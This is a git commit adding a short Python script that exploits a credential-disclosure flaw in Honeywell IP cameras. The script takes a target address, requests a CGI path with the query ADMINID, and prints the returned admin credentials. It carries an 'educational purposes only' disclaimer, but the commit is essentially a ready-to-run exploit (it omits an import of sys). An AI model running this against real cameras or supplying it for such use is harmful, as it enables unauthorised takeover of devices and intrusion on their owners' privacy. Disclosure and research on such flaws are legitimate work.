b23b851bbeabe96559e518a67610bb084c880748
phoenixits <bounty@phoenixit.org>
2016-08-20 17:36:23 +0200

    Create honeywell_ipcam_creds.py

---
+++ honeywell_ipcam_creds.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#
+#  Author: Kasper Larsen
+#  Twitter: @phoenixits
+#  GPG: keybase.io/phoenixit
+#
+#       Honeywell IP-Camera admin credential disclosure
+#       This was created for educational purposes only.
+
+import requests
+
+target = sys.argv[1]
+path = "/cgi-bin/readfile.cgi?query=ADMINID"
+url = "http://"+target+path
+r = requests.get(url)
+print(r.content)
